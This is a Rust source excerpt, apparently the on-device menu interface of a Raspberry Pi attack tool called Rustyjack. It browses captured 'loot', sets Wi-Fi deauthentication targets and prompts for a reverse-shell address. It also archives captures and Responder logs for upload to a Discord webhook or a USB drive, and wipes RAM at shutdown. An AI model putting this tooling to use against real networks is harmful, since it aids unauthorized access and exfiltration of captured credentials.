        let content: Vec<String> = std::iter::once(title.to_string())
            .chain(lines.into_iter().map(|line| line.as_ref().to_string()))
            .collect();
        self.display.draw_dialog(&content, &overlay)?;
        Ok(())
    }

    fn execute_with_progress<F, T>(&mut self, title: &str, message: &str, operation: F) -> Result<T>
    where
        F: FnOnce() -> Result<T>,
    {
        self.show_progress(title, [message, "Please wait..."])?;
        let result = operation();
        result
    }

    fn reload_config(&mut self) -> Result<()> {
        self.config = GuiConfig::load(&self.root)?;
        self.display.update_palette(&self.config.colors);
        self.show_message("Config", ["Reloaded"])
    }

    fn save_config(&mut self) -> Result<()> {
        self.config.save(&self.root.join("gui_conf.json"))?;
        self.show_message("Config", ["Saved"])
    }

    fn pick_color(&mut self, target: ColorTarget) -> Result<()> {
        // List-based selection to keep navigation consistent
        let choices = [
            ("White", "#FFFFFF"),
            ("Black", "#000000"),
            ("Green", "#00FF00"),
            ("Red", "#FF0000"),
            ("Blue", "#0000FF"),
            ("Navy", "#000080"),
            ("Purple", "#AA00FF"),
        ];
        let labels: Vec<String> = choices
            .iter()
            .map(|(name, _)| format!(" {}: {}", format!("{:?}", target), name))
            .collect();

        if let Some(idx) = self.choose_from_menu("Pick Color", &labels)? {
            let (_name, hex) = choices[idx];
            self.apply_color(target, hex);
            self.show_message("Colors", ["Updated"])
        } else {
            Ok(())
        }
    }

    fn apply_color(&mut self, target: ColorTarget, value: &str) {
        match target {
            ColorTarget::Background => self.config.colors.background = value.to_string(),
            ColorTarget::Border => self.config.colors.border = value.to_string(),
            ColorTarget::Text => self.config.colors.text = value.to_string(),
            ColorTarget::SelectedText => self.config.colors.selected_text = value.to_string(),
            ColorTarget::SelectedBackground => {
                self.config.colors.selected_background = value.to_string()
            }
            ColorTarget::Toolbar => self.config.colors.toolbar = value.to_string(),
        }
        self.display.update_palette(&self.config.colors);
    }

    fn apply_log_setting(&self) {
        if self.config.settings.logs_enabled {
            std::env::remove_var("RUSTYJACK_LOGS_DISABLED");
        } else {
            std::env::set_var("RUSTYJACK_LOGS_DISABLED", "1");
        }
    }

    fn toggle_logs(&mut self) -> Result<()> {
        self.config.settings.logs_enabled = !self.config.settings.logs_enabled;
        self.apply_log_setting();
        let config_path = self.root.join("gui_conf.json");
        let _ = self.config.save(&config_path);
        let state = if self.config.settings.logs_enabled {
            "ON"
        } else {
            "OFF"
        };
        self.show_message("Logs", [format!("Logging {}", state)])
    }

    fn tx_power_label(level: TxPowerSetting) -> (&'static str, &'static str) {
        match level {
            TxPowerSetting::Stealth => ("Stealth (1dBm)", "stealth"),
            TxPowerSetting::Low => ("Low (5dBm)", "low"),
            TxPowerSetting::Medium => ("Medium (12dBm)", "medium"),
            TxPowerSetting::High => ("High (18dBm)", "high"),
            TxPowerSetting::Maximum => ("Maximum", "maximum"),
        }
    }

    fn autopilot_mode_label(mode: AutopilotMode) -> &'static str {
        match mode {
            AutopilotMode::Standard => "Standard",
            AutopilotMode::Aggressive => "Aggressive",
            AutopilotMode::Stealth => "Stealth",
            AutopilotMode::Harvest => "Harvest",
        }
    }

    fn show_loot(&mut self, section: LootSection) -> Result<()> {
        let loot_base = match section {
            LootSection::Wireless => self.root.join("loot/Wireless"),
            LootSection::Ethernet => self.root.join("loot/Ethernet"),
        };

        if !loot_base.exists() {
            return self.show_message("Loot", ["No captures yet"]);
        }

        // Get list of network folders (or special folders like probe_sniff, karma)
        let mut networks: Vec<(String, PathBuf)> = Vec::new();

        if let Ok(entries) = std::fs::read_dir(&loot_base) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                        networks.push((name.to_string(), path));
                    }
                }
            }
        }

        // Also check for any loose files directly in loot_base
        let mut loose_files: Vec<PathBuf> = Vec::new();
        if let Ok(entries) = std::fs::read_dir(&loot_base) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() {
                    loose_files.push(path);
                }
            }
        }

        if networks.is_empty() && loose_files.is_empty() {
            return self.show_message("Loot", ["No captures yet"]);
        }

        // Sort networks alphabetically
        networks.sort_by(|a, b| a.0.to_lowercase().cmp(&b.0.to_lowercase()));

        // Build menu - networks first, then loose files
        let mut labels: Vec<String> = networks
            .iter()
            .map(|(name, _)| format!("[{}]", name))
            .collect();
        let mut paths: Vec<PathBuf> = networks.iter().map(|(_, p)| p.clone()).collect();

        // Add loose files at the end
        for file in &loose_files {
            if let Some(name) = file.file_name().and_then(|n| n.to_str()) {
                labels.push(name.to_string());
                paths.push(file.clone());
            }
        }

        loop {
            let Some(index) = self.choose_from_menu("Targets", &labels)? else {
                return Ok(());
            };

            let selected_path = &paths[index];

            if selected_path.is_dir() {
                // Show files in this network folder
                self.show_network_loot(selected_path)?;
            } else {
                // View the file directly
                self.view_loot_file(&selected_path.to_string_lossy())?;
            }
        }
    }

    /// Show loot files for a specific network/target
    fn show_network_loot(&mut self, network_dir: &Path) -> Result<()> {
        let network_name = network_dir
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("Unknown");

        self.browse_loot_dir(network_name, network_dir)
    }

    /// Generic directory browser for loot (shows dirs first, then files)
    fn browse_loot_dir(&mut self, title: &str, dir: &Path) -> Result<()> {
        let mut dirs: Vec<(String, PathBuf)> = Vec::new();
        let mut files: Vec<(String, PathBuf)> = Vec::new();

        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                let name = path
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("unknown")
                    .to_string();
                if path.is_dir() {
                    dirs.push((name, path));
                } else if path.is_file() {
                    files.push((name, path));
                }
            }
        }

        if dirs.is_empty() && files.is_empty() {
            return self.show_message(title, ["No files in this target"]);
        }

        dirs.sort_by(|a, b| a.0.to_lowercase().cmp(&b.0.to_lowercase()));
        files.sort_by(|a, b| a.0.to_lowercase().cmp(&b.0.to_lowercase()));

        let mut labels = Vec::new();
        let mut paths = Vec::new();
        let mut is_dir_flags = Vec::new();

        for (name, path) in &dirs {
            labels.push(format!("{}/", name));
            paths.push(path.clone());
            is_dir_flags.push(true);
        }
        for (name, path) in &files {
            labels.push(name.clone());
            paths.push(path.clone());
            is_dir_flags.push(false);
        }

        loop {
            let Some(index) = self.choose_from_menu(title, &labels)? else {
                return Ok(());
            };

            let path = &paths[index];
            if is_dir_flags[index] {
                let next_title = format!(
                    "{}/{}",
                    title,
                    path.file_name().and_then(|n| n.to_str()).unwrap_or("")
                );
                self.browse_loot_dir(&next_title, path)?;
            } else {
                self.view_loot_file(&path.to_string_lossy())?;
            }
        }
    }

    fn view_loot_file(&mut self, path: &str) -> Result<()> {
        // Read the file with a high line limit
        let read_args = LootReadArgs {
            path: PathBuf::from(path),
            max_lines: 5000,
        };
        let (_, data) = self
            .core
            .dispatch(Commands::Loot(LootCommand::Read(read_args)))?;

        let lines = data
            .get("lines")
            .and_then(Value::as_array)
            .map(|arr| {
                arr.iter()
                    .filter_map(Value::as_str)
                    .map(|s| s.to_string())
                    .collect::<Vec<_>>()
            })
            .unwrap_or_default();

        let truncated = data
            .get("truncated")
            .and_then(Value::as_bool)
            .unwrap_or(false);

        if lines.is_empty() {
            return self.show_message("Loot", ["File is empty"]);
        }

        let filename = Path::new(path)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("file")
            .to_string();

        // Scrollable file viewer
        self.scrollable_text_viewer(&filename, &lines, truncated)
    }

    fn scrollable_text_viewer(
        &mut self,
        title: &str,
        lines: &[String],
        truncated: bool,
    ) -> Result<()> {
        const LINES_PER_PAGE: usize = 9; // Reduced slightly to fit position indicator
        const MAX_TITLE_CHARS: usize = 15;

        let total_lines = lines.len();
        let mut line_offset = 0;
        let mut needs_redraw = true; // Track when redraw is needed

        // Clamp title without animation to avoid constant redraws
        let display_title = if title.len() > MAX_TITLE_CHARS {
            format!("{}...", &title[..MAX_TITLE_CHARS.saturating_sub(3)])
        } else {
            title.to_string()
        };

        loop {
            if needs_redraw {
                let overlay = self.stats.snapshot();
                let end = (line_offset + LINES_PER_PAGE).min(total_lines);
                let visible_lines: Vec<String> = lines[line_offset..end].to_vec();

                self.display.draw_file_viewer(
                    &display_title,
                    0,
                    &visible_lines,
                    line_offset,
                    total_lines,
                    truncated,
                    &overlay,
                )?;
                needs_redraw = false;
            }

            // Non-blocking button check with short timeout
            if let Some(button) = self.buttons.try_read_timeout(Duration::from_millis(100))? {
                match self.map_button(button) {
                    ButtonAction::Down => {
                        if line_offset + LINES_PER_PAGE < total_lines {
                            line_offset += 1;
                            needs_redraw = true;
                        }
                    }
                    ButtonAction::Up => {
                        if line_offset > 0 {
                            line_offset = line_offset.saturating_sub(1);
                            needs_redraw = true;
                        }
                    }
                    ButtonAction::Select => {
                        // Page down
                        if line_offset + LINES_PER_PAGE < total_lines {
                            line_offset = (line_offset + LINES_PER_PAGE)
                                .min(total_lines.saturating_sub(LINES_PER_PAGE));
                            needs_redraw = true;
                        }
                    }
                    ButtonAction::Back => {
                        return Ok(());
                    }
                    ButtonAction::MainMenu => {
                        self.menu_state.home();
                        return Ok(());
                    }
                    ButtonAction::Refresh => {
                        needs_redraw = true;
                    }
                    ButtonAction::Reboot => {
                        self.confirm_reboot()?;
                        needs_redraw = true;
                    }
                }
            }
        }
    }

    fn restart_system(&mut self) -> Result<()> {
        Command::new("reboot").status().ok();
        Ok(())
    }

    /// Attempt to wipe free memory then power off the device.
    /// This is best-effort: it overwrites available RAM pages before shutdown.
    fn secure_shutdown(&mut self) -> Result<()> {
        // Explain what will happen
        self.show_message(
            "Secure Shutdown",
            [
                "Attempt to overwrite free RAM",
                "and power off the device.",
                "",
                "Use on the Pi only. This",
                "will stop all services.",
            ],
        )?;

        let options = vec!["Wipe RAM + Power Off".to_string(), "Cancel".to_string()];
        let choice = self.choose_from_list("Confirm", &options)?;
        if choice != Some(0) {
            return Ok(());
        }

        // Sync disks before wiping
        self.show_progress("Secure Shutdown", ["Syncing disks...", ""])?;
        let _ = Command::new("sync").status();

        // Best-effort memory wipe
        self.show_progress(
            "Secure Shutdown",
            ["Wiping memory...", "This may take a few seconds"],
        )?;
        let _ = self.best_effort_ram_wipe();

        // Power off
        self.show_progress("Secure Shutdown", ["Powering off now...", ""])?;
        let _ = Command::new("systemctl")
            .arg("poweroff")
            .status()
            .or_else(|_| Command::new("shutdown").args(["-h", "now"]).status());

        Ok(())
    }

    /// Overwrite available RAM to reduce residual data.
    fn best_effort_ram_wipe(&self) -> Result<()> {
        // Parse MemAvailable from /proc/meminfo
        let meminfo = fs::read_to_string("/proc/meminfo").unwrap_or_default();
        let available_kb = meminfo
            .lines()
            .find(|l| l.starts_with("MemAvailable:"))
            .and_then(|line| line.split_whitespace().nth(1))
            .and_then(|kb| kb.parse::<u64>().ok())
            .unwrap_or(64 * 1024); // fall back to 64MB if parsing fails

        // Use ~95% of available RAM; keep a small buffer to avoid the OOM killer
        let target_bytes = available_kb.saturating_mul(1024) * 95 / 100;
        let chunk_size: usize = 1 * 1024 * 1024; // 1MB chunks for tighter coverage

        let mut allocated = 0u64;
        let mut buffers: Vec<Vec<u8>> = Vec::new();

        while allocated < target_bytes {
            let remaining = target_bytes - allocated;
            let size = std::cmp::min(chunk_size as u64, remaining) as usize;
            if size == 0 {
                break;
            }

            // Allocate and touch the memory so pages are actually written
            let mut buf = Vec::with_capacity(size);
            buf.resize(size, 0u8);
            for chunk in buf.chunks_mut(4096) {
                chunk[0] = 0;
            }
            allocated += size as u64;
            buffers.push(buf);
        }

        // Drop buffers to release memory before shutdown
        drop(buffers);
        Ok(())
    }

    fn choose_from_list(&mut self, title: &str, items: &[String]) -> Result<Option<usize>> {
        // Reuse the menu-style selector so options are visible as a list.
        self.choose_from_menu(title, items)
    }

    /// Show a paginated menu (styled like the main menu) and return index
    fn choose_from_menu(&mut self, title: &str, items: &[String]) -> Result<Option<usize>> {
        if items.is_empty() {
            return Ok(None);
        }

        const VISIBLE: usize = 9;
        let mut index: usize = 0;
        let mut offset: usize = 0;

        loop {
            let total = items.len();
            // Clamp offset so selected is visible
            if index < offset {
                offset = index;
            } else if index >= offset + VISIBLE {
                offset = index.saturating_sub(VISIBLE - 1);
            }

            let overlay = self.stats.snapshot();

            // Build window slice of labels
            let slice: Vec<String> = items.iter().skip(offset).take(VISIBLE).cloned().collect();
            // Display menu with selected relative index
            let displayed_selected = index.saturating_sub(offset);
            self.display
                .draw_menu(title, &slice, displayed_selected, &overlay)?;

            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Up => {
                    if index == 0 {
                        index = total - 1;
                    } else {
                        index -= 1;
                    }
                }
                ButtonAction::Down => index = (index + 1) % total,
                ButtonAction::Select => return Ok(Some(index)),
                ButtonAction::Back => return Ok(None),
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    return Ok(None);
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
                _ => {}
            }
        }
    }

    fn prompt_octet(&mut self, prefix: &str) -> Result<Option<u8>> {
        let mut value: i32 = 1;
        loop {
            let overlay = self.stats.snapshot();
            let content = vec![
                "Reverse shell target".to_string(),
                format!("{prefix}.{}", value.clamp(0, 255)),
                "UP/DOWN to adjust".to_string(),
                "OK to confirm".to_string(),
            ];
            self.display.draw_dialog(&content, &overlay)?;
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Up => value = (value + 1).min(255),
                ButtonAction::Down => value = (value - 1).max(0),
                ButtonAction::Select => return Ok(Some(value as u8)),
                ButtonAction::Back => return Ok(None),
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    return Ok(None);
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
                _ => {}
            }
        }
    }

    fn handle_network_selection(&mut self, network: &WifiNetworkEntry) -> Result<()> {
        let Some(ssid) = network
            .ssid
            .as_deref()
            .filter(|s| !s.is_empty())
            .map(|s| s.to_string())
        else {
            self.show_message("Wi-Fi", ["Hidden SSID - configure via CLI"])?;
            return Ok(());
        };
        let mut details = vec![format!("SSID: {ssid}")];
        if let Some(signal) = network.signal_dbm {
            details.push(format!("Signal: {signal} dBm"));
        }
        if let Some(channel) = network.channel {
            details.push(format!("Channel: {channel}"));
        }
        if let Some(bssid) = network.bssid.as_deref() {
            details.push(format!("BSSID: {bssid}"));
        }
        details.push(if network.encrypted {
            "Encrypted: yes".to_string()
        } else {
            "Encrypted: no".to_string()
        });
        self.show_message("Network", details.iter().map(|s| s.as_str()))?;

        let actions = vec![
            "Connect".to_string(),
            "Set Target".to_string(),
            "Back".to_string(),
        ];
        if let Some(choice) = self.choose_from_list("Network action", &actions)? {
            match choice {
                0 => {
                    // Connect
                    if self.connect_profile_by_ssid(&ssid)? {
                        // message handled in helper
                    } else {
                        let msg = vec![format!("No saved profile for {ssid}")];
                        self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
                    }
                }
                1 => {
                    // Set as Target for deauth attack. We will accept a target even
                    // if the network record omits the BSSID. When BSSID is missing
                    // we store an empty string — deauth attacks require a BSSID and
                    // will error later if it's absent, so the UI warns the user.
                    self.config.settings.target_network = ssid.clone();
                    self.config.settings.target_bssid = network.bssid.clone().unwrap_or_default();
                    self.config.settings.target_channel = network.channel.unwrap_or(0) as u8;

                    // Save config
                    let config_path = self.root.join("gui_conf.json");
                    if let Err(e) = self.config.save(&config_path) {
                        self.show_message("Error", [format!("Failed to save: {}", e)])?;
                    } else {
                        // Informative feedback — highlight missing BSSID if applicable
                        if self.config.settings.target_bssid.is_empty() {
                            self.show_message(
                                "Target Set",
                                [
                                    &format!("SSID: {}", ssid),
                                    "BSSID: (none)",
                                    &format!("Channel: {}", self.config.settings.target_channel),
                                    "",
                                    "Note: target has no BSSID. Deauth requires a BSSID",
                                ],
                            )?;
                        } else {
                            self.show_message(
                                "Target Set",
                                [
                                    &format!("SSID: {}", ssid),
                                    &format!("BSSID: {}", self.config.settings.target_bssid),
                                    &format!("Channel: {}", self.config.settings.target_channel),
                                    "",
                                    "Ready for Deauth Attack",
                                ],
                            )?;
                        }
                    }
                }
                _ => {}
            }
        }
        Ok(())
    }

    fn handle_profile_selection(&mut self, profile: &WifiProfileSummary) -> Result<()> {
        let actions = vec![
            "Connect".to_string(),
            "Delete".to_string(),
            "Back".to_string(),
        ];
        if let Some(choice) =
            self.choose_from_list(&format!("Profile {}", profile.ssid), &actions)?
        {
            match choice {
                0 => self.connect_named_profile(&profile.ssid)?,
                1 => self.delete_profile(&profile.ssid)?,
                _ => {}
            }
        }
        Ok(())
    }

    fn fetch_wifi_scan(&mut self) -> Result<WifiScanResponse> {
        let args = WifiScanArgs { interface: None };
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Scan(args)))?;
        let resp: WifiScanResponse = serde_json::from_value(data)?;
        Ok(resp)
    }

    fn fetch_wifi_profiles(&mut self) -> Result<Vec<WifiProfileSummary>> {
        let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
            WifiProfileCommand::List,
        )))?;
        let resp: WifiProfilesResponse = serde_json::from_value(data)?;
        Ok(resp.profiles)
    }

    fn fetch_wifi_interfaces(&mut self) -> Result<Vec<InterfaceSummary>> {
        let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::List))?;
        let resp: WifiListResponse = serde_json::from_value(data)?;
        Ok(resp.interfaces)
    }

    fn fetch_route_snapshot(&mut self) -> Result<RouteSnapshot> {
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Status)))?;
        let resp: RouteSnapshot = serde_json::from_value(data)?;
        Ok(resp)
    }

    fn fetch_wifi_status(&mut self, interface: Option<String>) -> Result<WifiStatusOverview> {
        let args = WifiStatusArgs { interface };
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Status(args)))?;
        let status: WifiStatusOverview = serde_json::from_value(data)?;
        Ok(status)
    }

    fn connect_profile_by_ssid(&mut self, ssid: &str) -> Result<bool> {
        let profiles = self.fetch_wifi_profiles()?;
        if !profiles.iter().any(|profile| profile.ssid == ssid) {
            return Ok(false);
        }
        self.connect_named_profile(ssid)?;
        Ok(true)
    }

    fn connect_named_profile(&mut self, ssid: &str) -> Result<()> {
        self.apply_identity_hardening();
        self.show_progress("Wi-Fi", ["Connecting...", ssid, "Please wait"])?;

        let args = WifiProfileConnectArgs {
            profile: Some(ssid.to_string()),
            ssid: None,
            password: None,
            interface: None,
            remember: false,
        };

        match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
            WifiProfileCommand::Connect(args),
        ))) {
            Ok(_) => {
                let msg = vec![format!("Connected to {ssid}")];
                self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = vec![format!("Connection failed:"), format!("{err}")];
                self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn delete_profile(&mut self, ssid: &str) -> Result<()> {
        let args = WifiProfileDeleteArgs {
            ssid: ssid.to_string(),
        };
        match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
            WifiProfileCommand::Delete(args),
        ))) {
            Ok(_) => {
                let msg = vec![format!("Deleted {ssid}")];
                self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = vec![format!("{err}")];
                self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn discord_upload(&mut self) -> Result<()> {
        // Check if webhook is configured first
        let webhook_path = self.root.join("discord_webhook.txt");
        let has_webhook = if webhook_path.exists() {
            if let Ok(content) = fs::read_to_string(&webhook_path) {
                let trimmed = content.trim();
                trimmed.starts_with("https://discord.com/api/webhooks/") && !trimmed.is_empty()
            } else {
                false
            }
        } else {
            false
        };

        if !has_webhook {
            return self.show_message(
                "Discord Error",
                [
                    "No webhook configured",
                    "",
                    "Create file:",
                    "discord_webhook.txt",
                    "with your webhook URL",
                ],
            );
        }

        let (temp_path, archive_path) = self.build_loot_archive()?;
        let args = DiscordSendArgs {
            title: "Rustyjack Loot".to_string(),
            message: Some("Complete loot archive".to_string()),
            file: Some(archive_path.clone()),
            target: None,
            interface: None,
        };
        let result = self.core.dispatch(Commands::Notify(NotifyCommand::Discord(
            DiscordCommand::Send(args),
        )));
        drop(temp_path);
        match result {
            Ok(_) => self.show_message("Discord", ["Loot uploaded"])?,
            Err(err) => {
                let msg = err.to_string();
                self.show_message("Discord", [msg.as_str()])?;
            }
        }
        Ok(())
    }

    fn transfer_to_usb(&mut self) -> Result<()> {
        // Find USB mount point
        let usb_path = match self.find_usb_mount() {
            Ok(path) => path,
            Err(_e) => {
                self.show_message(
                    "USB Transfer Error",
                    [
                        "No USB drive detected",
                        "Please insert a USB drive",
                        "and try again",
                    ],
                )?;
                return Ok(());
            }
        };

        let loot_dir = self.root.join("loot");
        let responder_logs = self.root.join("Responder").join("logs");

        if !loot_dir.exists() && !responder_logs.exists() {
            self.show_message("USB Transfer", ["No loot to transfer"])?;
            return Ok(());
        }

        // Collect all files to transfer
        let mut files = Vec::new();
        if loot_dir.exists() {
            for entry in WalkDir::new(&loot_dir) {
                let entry = entry?;
                if entry.file_type().is_file() {
                    files.push(entry.path().to_path_buf());
                }
            }
        }
        if responder_logs.exists() {
            for entry in WalkDir::new(&responder_logs) {
                let entry = entry?;
                if entry.file_type().is_file() {
                    files.push(entry.path().to_path_buf());
                }
            }
        }

        if files.is_empty() {
            self.show_message("USB Transfer", ["No files to transfer"])?;
            return Ok(());
        }

        let total_files = files.len();
        let status = self.stats.snapshot();

        // Transfer files with progress
        for (idx, file_path) in files.iter().enumerate() {
            let progress = ((idx + 1) as f32 / total_files as f32) * 100.0;

            let filename = file_path
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("file");

            self.display
                .draw_progress_dialog("USB Transfer", filename, progress, &status)?;

            // Determine destination path
            let dest = if file_path.starts_with(&loot_dir) {
                let rel = file_path.strip_prefix(&loot_dir).unwrap_or(file_path);
                usb_path.join("Rustyjack_Loot").join("loot").join(rel)
            } else if file_path.starts_with(&responder_logs) {
                let rel = file_path.strip_prefix(&responder_logs).unwrap_or(file_path);
                usb_path
                    .join("Rustyjack_Loot")
                    .join("ResponderLogs")
                    .join(rel)
            } else {
                continue;
            };

            // Create destination directory
            if let Some(parent) = dest.parent() {
                fs::create_dir_all(parent)?;
            }

            // Copy file
            fs::copy(file_path, &dest)?;
        }

        self.show_message(
            "USB Transfer",
            [
                &format!("Transferred {} files", total_files),
                "to USB drive",
            ],
        )?;

        Ok(())
    }

    fn find_usb_mount(&self) -> Result<PathBuf> {
        // First, find USB block devices by checking /sys/block/
        let usb_devices = self.find_usb_block_devices();

        if usb_devices.is_empty() {
            bail!("No USB storage device detected. Please insert a USB drive.");
        }

        // Now find mount points for these USB devices
        let mounts = self.read_mount_points()?;

        for usb_dev in &usb_devices {
            // Check for partitions (e.g., sda1, sdb1) or the device itself
            for (device, mount_point) in &mounts {
                // Match if device starts with the USB device name (handles partitions)
                // e.g., /dev/sda1 starts with "sda"
                let dev_name = device.strip_prefix("/dev/").unwrap_or(device);
                if dev_name.starts_with(usb_dev) {
                    // Verify it's writable
                    if self.is_writable_mount(Path::new(mount_point)) {
                        return Ok(PathBuf::from(mount_point));
                    }
                }
            }
        }

        // Fallback: check common mount points but be more selective
        let mount_points = ["/media", "/mnt", "/run/media"];

        for base in &mount_points {
            let base_path = Path::new(base);
            if !base_path.exists() {
                continue;
            }

            // Iterate through subdirectories (usually named after user or device)
            if let Ok(entries) = fs::read_dir(base_path) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_dir() {
                        // For /media and /run/media, check subdirectories too (user folders)
                        if let Ok(sub_entries) = fs::read_dir(&path) {
                            for sub_entry in sub_entries.flatten() {
                                let sub_path = sub_entry.path();
                                if sub_path.is_dir() && self.is_usb_storage_mount(&sub_path) {
                                    return Ok(sub_path);
                                }
                            }
                        }
                        // Also check direct mount
                        if self.is_usb_storage_mount(&path) {
                            return Ok(path);
                        }
                    }
                }
            }
        }

        bail!("No USB storage drive found. Please insert a USB drive.")
    }

    /// Find USB block devices by checking /sys/block/ for removable USB devices
    fn find_usb_block_devices(&self) -> Vec<String> {
        let mut usb_devices = Vec::new();

        let sys_block = Path::new("/sys/block");
        if !sys_block.exists() {
            return usb_devices;
        }

        if let Ok(entries) = fs::read_dir(sys_block) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();

                // Skip loop devices, ram disks, and mmcblk (SD cards - usually the boot drive)
                if name.starts_with("loop") || name.starts_with("ram") || name.starts_with("mmcblk")
                {
                    continue;
                }

                // Check if it's a removable device
                let removable_path = entry.path().join("removable");
                let is_removable = fs::read_to_string(&removable_path)
                    .map(|s| s.trim() == "1")
                    .unwrap_or(false);

                // Check if it's a USB device by looking at the device path
                let device_path = entry.path().join("device");
                let is_usb = if device_path.exists() {
                    // Follow symlink and check if path contains "usb"
                    fs::read_link(&device_path)
                        .map(|p| p.to_string_lossy().contains("usb"))
                        .unwrap_or(false)
                } else {
                    false
                };

                // Also check uevent for DRIVER=usb-storage
                let uevent_path = entry.path().join("device").join("uevent");
                let is_usb_storage = fs::read_to_string(&uevent_path)
                    .map(|s| s.contains("usb-storage") || s.contains("usb"))
                    .unwrap_or(false);

                if is_removable || is_usb || is_usb_storage {
                    // Make sure it has a size > 0 (actually a storage device)
                    let size_path = entry.path().join("size");
                    let has_size = fs::read_to_string(&size_path)
                        .map(|s| s.trim().parse::<u64>().unwrap_or(0) > 0)
                        .unwrap_or(false);

                    if has_size {
                        usb_devices.push(name);
                    }
                }
            }
        }

        usb_devices
    }

    /// Read mount points from /proc/mounts
    fn read_mount_points(&self) -> Result<Vec<(String, String)>> {
        let contents = fs::read_to_string("/proc/mounts").context("Failed to read /proc/mounts")?;

        let mut mounts = Vec::new();
        for line in contents.lines() {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                let device = parts[0].to_string();
                let mount_point = parts[1].to_string();

                // Only consider actual device mounts (not tmpfs, proc, etc.)
                if device.starts_with("/dev/") {
                    mounts.push((device, mount_point));
                }
            }
        }

        Ok(mounts)
    }

    /// Check if a path is likely a USB storage mount (not a WiFi dongle, etc.)
    fn is_usb_storage_mount(&self, path: &Path) -> bool {
        // Must be writable
        if !self.is_writable_mount(path) {
            return false;
        }

        // Check filesystem type - USB storage typically uses vfat, exfat, ntfs, ext4
        // This helps exclude pseudo-filesystems and network mounts
        let mount_path_str = path.to_string_lossy();

        if let Ok(contents) = fs::read_to_string("/proc/mounts") {
            for line in contents.lines() {
                if line.contains(&*mount_path_str) {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 3 {
                        let fs_type = parts[2];
                        // Common USB storage filesystems
                        if matches!(
                            fs_type,
                            "vfat"
                                | "exfat"
                                | "ntfs"
                                | "ntfs3"
                                | "ext4"
                                | "ext3"
                                | "ext2"
                                | "fuseblk"
                        ) {
                            return true;
                        }
                    }
                }
            }
        }

        false
    }

    fn is_writable_mount(&self, path: &Path) -> bool {
        // Try to create a test file to verify write access
        let test_file = path.join(".rustyjack_test");
        if fs::write(&test_file, b"test").is_ok() {
            let _ = fs::remove_file(&test_file);
            true
        } else {
            false
        }
    }

    fn build_loot_archive(&self) -> Result<(TempPath, PathBuf)> {
        let mut temp = NamedTempFile::new()?;
        {
            let mut zip = ZipWriter::new(&mut temp);
            let options = FileOptions::default().compression_method(CompressionMethod::Deflated);
            self.add_directory_to_zip(&mut zip, &self.root.join("loot"), "loot/", options.clone())?;
            self.add_directory_to_zip(
                &mut zip,
                &self.root.join("Responder").join("logs"),
                "ResponderLogs/",
                options,
            )?;
            zip.finish()?;
        }
        let temp_path = temp.into_temp_path();
        let path = temp_path.to_path_buf();
        Ok((temp_path, path))
    }

    fn add_directory_to_zip(
        &self,
        zip: &mut ZipWriter<&mut NamedTempFile>,
        dir: &Path,
        prefix: &str,
        options: FileOptions,
    ) -> Result<()> {
        if !dir.exists() {
            return Ok(());
        }
        for entry in WalkDir::new(dir) {
            let entry = entry?;
            if entry.file_type().is_file() {
                let rel = entry.path().strip_prefix(dir).unwrap_or(entry.path());
                let mut name = PathBuf::from(prefix);
                name.push(rel);
                let name = name.to_string_lossy().replace('\\', "/");
                zip.start_file(name, options)?;
                let data = fs::read(entry.path())?;
                zip.write_all(&data)?;
            }
        }
        Ok(())
    }

    fn choose_interface_name(&mut self, title: &str, names: &[String]) -> Result<Option<String>> {
        if names.is_empty() {
            self.show_message("Interfaces", ["No interfaces detected"])?;
            return Ok(None);
        }
        let labels: Vec<String> = names.iter().map(|n| format!(" {n}")).collect();
        Ok(self
            .choose_from_list(title, &labels)?
            .map(|idx| names[idx].clone()))
    }

    fn choose_interface_prompt(&mut self, title: &str) -> Result<Option<String>> {
        let (_, data) = self
            .core
            .dispatch(Commands::Hardware(HardwareCommand::Detect))?;
        let mut names: Vec<String> = Vec::new();
        if let Some(arr) = data.get("ethernet_ports").and_then(|v| v.as_array()) {
            for item in arr {
                if let Ok(info) = serde_json::from_value::<InterfaceSummary>(item.clone()) {
                    names.push(info.name);
                }
            }
        }
        if let Some(arr) = data.get("wifi_modules").and_then(|v| v.as_array()) {
            for item in arr {
                if let Ok(info) = serde_json::from_value::<InterfaceSummary>(item.clone()) {
                    names.push(info.name);
                }
            }
        }
        names.sort();
        names.dedup();
        self.choose_interface_name(title, &names)
    }

    /// Choose a wireless interface (wifi_modules) with active preselection if present
    fn choose_wifi_interface(&mut self, title: &str) -> Result<Option<String>> {
        let (_, data) = self
            .core
            .dispatch(Commands::Hardware(HardwareCommand::Detect))?;
